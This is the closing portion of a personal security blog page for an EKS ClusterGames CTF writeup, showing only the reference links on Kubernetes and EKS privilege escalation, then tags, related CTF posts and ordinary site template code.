<h3 id="references"><span class="me-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<ul>
  <li>https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities/#pivoting-to-the-cloud-environment-by-stealing-pod-identities</li>
  <li>https://seifrajhi.github.io/blog/kubernetes-rbac-privilege-escalation-mitigation/</li>
  <li>https://blog.calif.io/p/privilege-escalation-in-eks</li>
</ul>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw me-1"></i>
    
      <a href='/categories/writeups/'>Writeups</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw me-1"></i>
      
      <a href="/tags/cloud-security/"
          class="post-tag no-text-decoration" >cloud security</a>
      
      <a href="/tags/kubernetes/"
          class="post-tag no-text-decoration" >kubernetes</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!-- Post sharing snippet -->

<div class="share-wrapper">
  <span class="share-label text-muted me-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
      <a
        href="https://twitter.com/intent/tweet?text=EKS%20ClusterGames%20Writeups%20-%20Sl4y3r_07&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FEKS-ClusterGames-Writeups%2F"
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Twitter"
        target="_blank"
        rel="noopener"
        aria-label="Twitter"
      >
        <i class="fa-fw fab fa-twitter"></i>
      </a>
    
      
      <a
        href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FEKS-ClusterGames-Writeups%2F&text=EKS%20ClusterGames%20Writeups%20-%20Sl4y3r_07"
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Telegram"
        target="_blank"
        rel="noopener"
        aria-label="Telegram"
      >
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    
      
      <a
        href="https://www.linkedin.com/sharing/share-offsite/?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FEKS-ClusterGames-Writeups%2F"
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Linkedin"
        target="_blank"
        rel="noopener"
        aria-label="Linkedin"
      >
        <i class="fa-fw fab fa-linkedin"></i>
      </a>
    

    <i
      id="copy-link"
      class="fa-fw fas fa-link small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
    </i>
  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
      
    </div>
  </div>
  <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
    <div class="access">
      <!-- Get the last 5 posts from lastmod list. -->














  <div id="access-lastmod" class="post">
    <div class="panel-heading">Recently Updated</div>
    <ul class="post-content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Piping-Process-In-Shell/">Piping Process In Shell</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CPU-Scheduling/">CPU Scheduling</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/BackdoorCTF'23-Writeups/">BackdoorCTF'23 Writeups</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Networking-Part-1/">Networking - Part 1</a>
        </li>
      
    </ul>
  </div>
  <!-- #access-lastmod -->


      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/reversing/">reversing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/computer-networking/">Computer Networking</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/forensics/">Forensics</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cloud-security/">cloud security</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/computer-science/">Computer Science</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/computer-systems/">Computer Systems</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/golang/">Golang</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/kubernetes/">kubernetes</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/malware-analysis/">Malware Analysis</a>
      
    </div>
  </div>


    </div>

    
      
      



  <div id="toc-wrapper" class="ps-0 pe-4 mb-5">
    <div class="panel-heading ps-3 pt-2 mb-2">Contents</div>
    <nav id="toc"></nav>
  </div>


    
  </div>
</div>

<!-- tail -->

  <div class="row">
    <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-3 pe-xl-4 mt-5">
      
        
        <!--
  Recommend the other 3 posts according to the tags and categories of the current post,
  if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->








  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  






<!-- Fill with the other newlest posts -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ms-1" data-toc-skip>
      Further Reading
    </h3>
    <div class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        
        
        <div class="col">
          <a href="/posts/CSAW'23-Quals/" class="card post-preview h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em
  class="small"
  data-ts="1695010300"
  data-df="ll"
  
>
  Sep 18, 2023
</em>

              <h4 class="pt-0 my-2" data-toc-skip>CSAW'23 Quals</h4>
              <div class="text-muted small">
                <p>
                  





                  I had the privilege of participating in the CSAW’23 Quals CTF as a member of InfosecIITR, and it proved to be a great experience. I am delighted to share the writeups for the reversing challenges m...
                </p>
              </div>
            </div>
          </a>
        </div>
      
        
        
        <div class="col">
          <a href="/posts/BackdoorCTF'23-Writeups/" class="card post-preview h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em
  class="small"
  data-ts="1703304700"
  data-df="ll"
  
>
  Dec 23, 2023
</em>

              <h4 class="pt-0 my-2" data-toc-skip>BackdoorCTF'23 Writeups</h4>
              <div class="text-muted small">
                <p>
                  





                  I’m sharing writeups for the challenges I  created for Backdoor CTF’23, hosted by InfoSecIITR. Here they are :-

Forensics/Headache

Description:-
I’ve had a headache since last evening. Is there a...
                </p>
              </div>
            </div>
          </a>
        </div>
      
        
        
        <div class="col">
          <a href="/posts/BackdoorCTF'24-Writeup/" class="card post-preview h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em
  class="small"
  data-ts="1734927100"
  data-df="ll"
  
>
  Dec 23, 2024
</em>

              <h4 class="pt-0 my-2" data-toc-skip>BackdoorCTF'24 Writeup</h4>
              <div class="text-muted small">
                <p>
                  





                  Reversing/ GoBlind

Description:
This binary hides its secrets deep within. Can you untangle the layers and reveal the secret?

File : file

Writeup

  This challenge was written in GoLang.
  Execu...
                </p>
              </div>
            </div>
          </a>
        </div>
      
    </div>
    <!-- .card-deck -->
  </div>
  <!-- #related-posts -->


      
        
        <!-- Navigation buttons at the bottom of the post. -->

<div class="post-navigation d-flex justify-content-between">
  
    <a
      href="/posts/Networking-Part-3/"
      class="btn btn-outline-primary"
      prompt="Older"
    >
      <p>Networking - Part 3</p>
    </a>
  

  
    <div
      class="btn btn-outline-primary disabled"
      prompt="Newer"
    >
      <p>-</p>
    </div>
  
</div>

      
        
        <!--  The comments switcher -->


      
    </div>
  </div>


        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 post-content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/reversing/">reversing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/computer-networking/">Computer Networking</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/forensics/">Forensics</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cloud-security/">cloud security</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/computer-science/">Computer Science</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/computer-systems/">Computer Systems</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/golang/">Golang</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/kubernetes/">kubernetes</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/malware-analysis/">Malware Analysis</a>
      
    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>
    </div>

    <!-- The Footer -->

<footer>
  <div class="container px-lg-4">
    <div class="d-flex justify-content-center align-items-center text-muted mx-md-3">
      <p>Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
      </p>

      <p>©
        2025
        <a href="https://twitter.com/username">Ayush Goyal</a>.
        
          <span
            data-bs-toggle="tooltip"
            data-bs-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
          >Some rights reserved.</span>
        
      </p>
    </div>
  </div>
</footer>


    <div id="mask"></div>

    <button id="back-to-top" aria-label="back-to-top" class="btn btn-lg btn-box-shadow">
      <i class="fas fa-angle-up"></i>
    </button>

    
      <div
        id="notification"
        class="toast"
        role="alert"
        aria-live="assertive"
        aria-atomic="true"
        data-bs-animation="true"
        data-bs-autohide="false"
      >
        <div class="toast-header">
          <button
            type="button"
            class="btn-close ms-auto"
            data-bs-dismiss="toast"
            aria-label="Close"
          ></button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="px-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.0/dist/jquery.min.js,npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.7/dayjs.min.js,npm/dayjs@1.11.7/locale/en.min.js,npm/dayjs@1.11.7/plugin/relativeTime.min.js,npm/dayjs@1.11.7/plugin/localizedFormat.min.js,npm/tocbot@4.21.0/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '<div class="px-1 px-sm-2 px-lg-4 px-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

